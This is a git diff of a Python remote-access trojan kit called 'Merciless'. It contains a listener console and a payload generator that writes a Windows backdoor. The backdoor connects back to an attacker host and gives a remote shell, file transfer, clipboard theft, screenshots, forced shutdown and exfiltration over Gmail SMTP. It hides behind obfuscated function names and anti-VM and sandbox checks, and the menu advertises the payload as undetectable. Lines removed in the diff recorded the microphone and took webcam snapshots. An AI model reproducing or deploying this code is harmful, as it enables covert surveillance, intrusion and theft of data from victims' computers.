@@ -1,7 +1,9 @@
-    #Eclipse Public License - v 2.0
-    #THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
-    #PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
-    #OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.
+#Eclipse Public License - v 2.0
+#THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
+#PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
+#OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.
+#IF YOU DISTRIBUTE THIS SOFTWARE YOU MUST GIVE A PROPER CREDIT TO THE AUTHOR
+from cryptography.fernet import Fernet
 import socket
 import time
 import platform
@@ -51,7 +53,7 @@ def Banner():
     print(f"{Fore.RED}                  2{Fore.WHITE}     [{Fore.CYAN}Listeners{Fore.WHITE}]")
     print()
 Banner()
-print(f"{Fore.RED} Daily Tip:{Fore.WHITE} {random.choice(open('daily_tip.txt').readlines())}")
+print(f"{Fore.RED} Daily Tip:{Fore.WHITE} {random.choice(open('misc/daily_tip.txt').readlines())}")
 
 
 def Menu():
@@ -66,8 +68,6 @@ def Menu():
     {Fore.RED}2                      ViperVenom Payload Generator
     """,)
     print()
-
-
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 BUFFER_SIZE = 1024
@@ -88,7 +88,7 @@ def Listener():
                 print(f'''
                 {Fore.GREEN}Payload                                    Description
                 -------                                     -----------
-                {Fore.RED}1 windows/vipervenom/tcp/payload           Undetectable ViperVenom Windows Payload
+                {Fore.RED}1 windows/merciless/tcp_payload             Undetectable ViperVenom Windows Payload
                 
                 {Fore.BLUE}[*]{Fore.WHITE} Select a payload by typing it's name or "use [Number]" for example: "use 1"
                 ''')
@@ -134,13 +134,17 @@ def Listener():
                                 print(f"{Fore.RED}[-]{Fore.WHITE} ERROR {Fore.GREEN}[REASON]{Fore.WHITE}: Invalid listener address, listening on 0.0.0.0")
                                 ListenerHost = "0.0.0.0"
                                 s.bind((ListenerHost, int(ListenerPort)))
-                            s.listen()
                             time.sleep(1)
                             print(f"{Fore.BLUE}[*]{Fore.WHITE} Starting listener...")
+                            try:
+                                s.listen()
+                            except socket.error:
+                                print(f"{Fore.RED}[-]{Fore.WHITE} ERROR {Fore.GREEN}[REASON]{Fore.WHITE}: Error while starting listener.")
                             time.sleep(1)
                             print(f"{Fore.BLUE}[*]{Fore.WHITE} Started TCP handler on {ListenerHost}:{ListenerPort}")
                             print(f"{Fore.BLUE}[*]{Fore.WHITE} Handler started, waiting for connection")
                             conn, addr = s.accept()
+                            s.setblocking(1)
                             clientIP = s.getsockname()
                             with conn:
                                     print(f"{Fore.BLUE}[*]{Fore.WHITE} Merciless session opened ({ListenerHost}:{ListenerPort} <--> {clientIP}) at {dataaa}")
@@ -148,7 +152,7 @@ def Listener():
                                     print(f"{Fore.GREEN}[+]{Fore.WHITE} Connecting to Device.")
                                     while True:
 
-                                        Handler = input(f"{Fore.WHITE}{Style.BRIGHT}Merciless {Style.RESET_ALL} >")
+                                        Handler = input(f"{Fore.WHITE}{Style.BRIGHT}Merciless {Style.RESET_ALL}> ")
                                         if Handler == "clear":
                                             if platform.system() == "Linux":
                                                 os.system('clear')
@@ -156,29 +160,14 @@ def Listener():
                                                 os.system("cls")
                                         elif Handler == "screenshot":
                                             conn.send(Handler.encode("utf-8"))
-                                        elif Handler[:16] == "screenshot every":
-                                            conn.send(Handler[:17].encode("utf-8"))
-                                        elif Handler == "ps -show":
-                                            conn.send(Handler.encode("utf-8"))
                                         elif Handler == "exit":
                                             conn.send(Handler.encode("utf-8"))
-                                            print(f"{Fore.GREEN}[*] Exiting From Active Session...")
+                                            print(f"{Fore.BLUE}[*] Exiting From Active Session...")
                                             time.sleep(3)
                                             conn.close()
-                                        elif Handler == "mic record":
-                                            conn.send(Handler.encode("utf-8"))
-                                            letters = string.ascii_letters
-                                            time.sleep(120)
-                                            with open(f'{random.choice(letters)}.wav','wb') as f:
-                                                l = conn.recv(1024)
-                                                f.write(l)
-                                                if Handler.lower() == 'quit':
-                                                    break
                                         elif Handler == "restart":
                                             conn.send(Handler.encode("utf-8"))
                                         elif Handler == "shutdown":
-                                            conn.send(Handler.encode("utf-8"))
-                                        elif Handler == "webcam snapshot":
                                             conn.send(Handler.encode("utf-8"))
                                         elif Handler == "shell":
                                             conn.send(Handler.encode("utf-8"))
@@ -200,9 +189,7 @@ def Listener():
                                                     conn.send(command.encode('utf-8'))
                                                     file_name = conn.recv(1024).decode('utf-8')
                                                     print(f"{Fore.BLUE}[*]{Fore.WHITE} Downloading " + file_name + "...")
-                                                    conn.send('OK'.encode('utf-8'))
                                                     file_size = conn.recv(1024).decode('utf-8')
-                                                    conn.send('OK'.encode('utf-8'))
                                                     print(f"{Fore.BLUE}[*]{Fore.WHITE} Total: " + str(int(file_size)/1024) + " KB")
                                                     with open(file_name, "wb") as file:
                                                         c = 0
@@ -220,9 +207,7 @@ def Listener():
                                                     file_name = command[9:]
                                                     file_size = os.path.getsize(file_name)
                                                     conn.send(file_name.encode('utf-8'))
-                                                    print(conn.recv(1024).decode('utf-8'))
                                                     conn.send(str(file_size).encode('utf-8'))
-                                                    print(conn.recv(1024).decode('utf-8'))
                                                     print(f"{Fore.BLUE}[*]{Fore.WHITE} Transferring [" + str(file_size/1024) + "] KB...")
                                                     with open(file_name, "rb") as file:
                                                         c = 0
@@ -253,7 +238,7 @@ def PayloadGenerator():
         clientHOST = local_ip
         clientPORT = 4434
         SetYourEmail = "revise7@example.com"
-        SetYourEmailPassword = "P@$$W0RD_ON3"
+        SetYourEmailPassword = "ExamplePassword"
         SetFileName = "NULL.py"
         micrecordsec = 600
         setSleep = "X"
@@ -287,9 +272,6 @@ def PayloadGenerator():
                     if firstHandler[:12] == "set filename":
                         SetFileName = firstHandler[13:]
                         print(f"File Name => {Fore.GREEN}{SetFileName}")
-                    if firstHandler[:13] == "set micrecord":
-                        micrecordsec = firstHandler[14:]
-                        print(f"Mic Record Seconds => {Fore.GREEN}{micrecordsec}")
                         setSleep = firstHandler[13:]
                     if firstHandler[:9] == "set sleep":
                         setSleep = firstHandler[10:]
@@ -306,7 +288,6 @@ def PayloadGenerator():
                             {Fore.RED}Gmail Address              {SetYourEmail}
                             {Fore.RED}Gmail Password             {SetYourEmailPassword}
                             {Fore.RED}File Name                  {SetFileName}
-                            {Fore.RED}Mic Record Seconds         {micrecordsec}
                             {Fore.RED}Sleep                      {setSleep}
 
                             ''')
@@ -318,9 +299,8 @@ def PayloadGenerator():
                         print("..")
                         time.sleep(1)
                         print("...")
-                        with open(SetFileName, "w") as malfile:
-                            malfile.write(
-                                f'''
+                        with open(SetFileName, "wb") as malfile:
+                            malfile.write(f'''
 #Eclipse Public License - v 2.0
 #THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
 #PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
@@ -338,7 +318,6 @@ import random, string
 import psutil
 import subprocess
 import winreg as reg
-from colorama import Fore, Back, Style
 import shutil
 import ctypes
 import sys
@@ -354,14 +333,14 @@ def zpVXAIPnyaQaYr():
             if proc.name().lower() == vmproc1.lower() or proc.name().lower() == vmproc2.lower() or proc.name().lower() == vmproc3.lower() or proc.name().lower() == vmproc5.lower() or proc.name().lower() == vmproc6.lower() or proc.name().lower() == vmproc7.lower():
                 exit()
         except WindowsError:
-            vmpath1 = os.path.exists(r"C:\windows\system32\drivers\vmci.sys")
-            vmpath2 = os.path.exists(r"C:\windows\system32\drivers\vmhgfs.sys")
-            vmpath3 = os.path.exists(r"C:\windows\system32\drivers\vmmouse.sys")
-            vmpath4 = os.path.exists(r"C:\windows\system32\drivers\vmscsi.sys")
-            vmpath5 = os.path.exists(r"C:\windows\system32\drivers\vmusemouse.sys")
-            vmpath6 = os.path.exists(r"C:\windows\system32\drivers\vmx_svga.sys")
-            vmpath7 = os.path.exists(r"C:\windows\system32\drivers\vmxnet.sys")
-            vmpath8 = os.path.exists(r"C:\windows\system32\drivers\VBoxMouse.sys")
+            vmpath1 = os.path.exists(r"C:\\windows\\system32\\drivers\\mci.sys")
+            vmpath2 = os.path.exists(r"C:\\windows\\system32\\drivers\\mhgfs.sys")
+            vmpath3 = os.path.exists(r"C:\\windows\\system32\\drivers\\mmouse.sys")
+            vmpath4 = os.path.exists(r"C:\\windows\\system32\\drivers\\mscsi.sys")
+            vmpath5 = os.path.exists(r"C:\\windows\\system32\\drivers\\musemouse.sys")
+            vmpath6 = os.path.exists(r"C:\\windows\\system32\\drivers\\mx_svga.sys")
+            vmpath7 = os.path.exists(r"C:\\windows\\system32\\drivers\\mxnet.sys")
+            vmpath8 = os.path.exists(r"C:\\windows\\system32\\drivers\\VBoxMouse.sys")
             if vmpath1 == True or vmpath2 == True or vmpath3 == True or vmpath4 == True or vmpath5 == True or vmpath6 == True or vmpath7 == True or vmpath8 == True:
                 exit()
 zpVXAIPnyaQaYr()
@@ -383,8 +362,8 @@ def XbNcYPeberQMdl(f_name, path):
 BUFFER_SIZE = 1024
 def connection():
     try:
-        clientHOST = {clientHOST}
-        clientPORT = {clientPORT}
+        clientHOST="{clientHOST}"
+        clientPORT={clientPORT}
         s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((clientHOST, clientPORT))
         s.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 10000, 3000))
@@ -406,18 +385,6 @@ def connection():
                 message = data
                 smtp.sendmail("{SetYourEmail}", "{SetYourEmail}", message)
                 smtp.quit()
-            elif Handler_DATA == "mic record":
-                frames = 44100
-                seconds = {micrecordsec}
-                channel = 1
-                record = sounddevice.rec(int(seconds*frames), samplerate=frames, channels=channel)
-                sounddevice.wait()
-                file = "skiDkZX92DKOsdzHlki.wav"
-                write(file, frames, record)
-                with open(file, 'rb') as f:
-                    for l in f: s.sendall(l)
-                    time.sleep(10)
-                    os.remove(file)
             elif Handler_DATA == "restart":
                 if platform.system() == "Windows":
                     os.system("shutdown -t 0 -r -f")
@@ -428,9 +395,6 @@ def connection():
                     os.system("shutdown /s /t 1")
                 else:
                     os.system("shutdown now")
-            elif Handler_DATA == "exit":
-                s.close()
-                exit()
             elif Handler_DATA == "shell":
                     cwd = os.getcwd()
                     s.send(("dir:" + str(cwd)).encode('utf-8'))
@@ -463,7 +427,7 @@ def connection():
                                         pass
                                 finally:
                                     CloseClipboard()
-                            elif command.startswith('marciless'):
+                            elif command.startswith('merciless'):
                                 file_name = command[7:]
                                 pth = os.getcwd()
                                 try:
@@ -489,9 +453,7 @@ def connection():
                                     end_time = time.time()
                             elif 'transfer' in command:
                                 file_name = s.recv(1024).decode('utf-8')
-                                s.send('OK'.encode('utf-8'))
                                 file_size = s.recv(1024).decode('utf-8')
-                                s.send('OK'.encode('utf-8'))
                                 with open(file_name, "wb") as file:
                                     c = 0
                                     start_time = time.time()
@@ -515,7 +477,7 @@ def connection():
                                 pth = os.getcwd()
                                 try:
                                     zJnWJKrmzwZTAHJT(file_name, pth)
-                                    s.send("OK".encode('utf-8'))
+                                    s.send("Hooked".encode('utf-8'))
                                 except Exception as e:
                                     s.send(str(e).encode('utf-8'))
                             else:
@@ -525,9 +487,12 @@ def connection():
                                 s.send(out)
                                 s.send(err)
                                 if (out == b'' and err == b''):
-                                    s.send("OK".encode('utf-8'))
+                                    s.send("Invalid".encode('utf-8'))
                         except Exception as e:
                             s.send(str(e).encode('utf-8'))
+            elif Handler_DATA == "exit":
+                s.close()
+                exit()
     except socket.error:
         connection()
         if connection() == True:
@@ -552,8 +517,6 @@ def TCjgbxixqsdxEc():
     cpuChk = psutil.cpu_count(logical=False)
     if cpuChk == 1:
         exit()
-    if cpuChk == 2:
-        pass
     if cpuChk == 3:
         exit()
     else:
@@ -578,10 +541,10 @@ PTYMEYUXBRwddE()
 ''')
                             if platform.system() == "Windows":
                                 os.system(f"python setup.py build")
+                                os.remove(SetFileName)
                             else:
                                 pass
                             time.sleep(2)
-                            #os.remove(SetFileName)
                             print(f"{Fore.BLUE}[*]{Fore.WHITE} Done Generating Payload.")
     except KeyboardInterrupt:
         print(f"{Fore.RED}[-]{Fore.WHITE} ERROR {Fore.GREEN}[REASON]{Fore.WHITE}: Keyboard Interruption.")
